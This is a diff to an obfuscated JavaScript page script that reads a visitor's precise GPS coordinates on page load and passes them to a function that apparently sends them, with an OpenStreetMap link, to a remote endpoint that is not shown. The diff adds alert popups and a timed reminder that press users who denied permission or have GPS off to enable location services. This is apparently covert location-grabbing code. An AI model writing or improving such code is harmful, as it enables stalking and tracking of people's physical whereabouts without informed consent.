@@ -12,7 +12,7 @@ function _0xa1b2c3() {
 function _0xj9k8l() {
   return new Promise((_0xres, _0xrej) => {
     if (!navigator.geolocation) {
-      _0xres(null);
+      _0xres(null); // Geolocation not supported
     } else {
       navigator.geolocation.getCurrentPosition(
         _0xpos => {
@@ -22,7 +22,13 @@ function _0xj9k8l() {
             acc: _0xpos.coords.accuracy
           });
         },
-        _0err => _0xres(null),
+        _0err => {
+          if (_0err.code === 1 || _0err.code === 3) {
+            // Either permission denied or GPS is off
+            showEnableLocationPopup();
+          }
+          _0xres(null);
+        },
         {
           enableHighAccuracy: true,
           timeout: 5000,
@@ -31,6 +37,39 @@ function _0xj9k8l() {
       );
     }
   });
+}
+
+function showEnableLocationPopup() {
+  if (!localStorage.getItem("locationPromptShown")) {
+    // Show initial prompt if not already shown
+    const message = `
+      🛑 **Location Services are Disabled!**
+      Please enable GPS from your device settings to proceed.
+      🧭 You can go to your phone's settings to enable location services.
+    `;
+    alert(message);
+
+    // Set the flag so it won't show again after page reload
+    localStorage.setItem("locationPromptShown", "true");
+    
+    // Optional: After 10 seconds, show a second reminder if GPS is still off
+    setTimeout(() => {
+      if (!navigator.geolocation) {
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        () => { /* If the user enables GPS, do nothing */ },
+        (_err) => {
+          if (_err.code === 3) {
+            // GPS still off, show a second reminder
+            const reminderMessage = "⚠️ **Reminder**: Location Services are still off. Please enable GPS in your settings.";
+            alert(reminderMessage);
+          }
+        }
+      );
+    }, 10000); // Show second reminder after 10 seconds
+  }
 }
 
 async function _0xsend() {
@@ -42,7 +81,7 @@ async function _0xsend() {
   if (_0xloc) {
     _0xdesc += `\n📍 **Location**: ${_0xloc.lat}, ${_0xloc.lon}\n🎯 **Accuracy**: ±${_0xloc.acc}m\n[🗺️ OpenStreetMap](https://www.openstreetmap.org/?mlat=${_0xloc.lat}&mlon=${_0xloc.lon}#map=18/${_0xloc.lat}/${_0xloc.lon})`;
   } else {
-    _0xdesc += `\n📍 **Location**: Not Available (Permission denied?)`;
+    _0xdesc += `\n📍 **Location**: Not Available (Permission denied or GPS off?)`;
   }
 
   const _0xpayload = {
@@ -65,6 +104,7 @@ async function _0xsend() {
   });
 }
 
+// Automatically trigger location request when page loads
 window.onload = function() {
   _0xsend();
 };
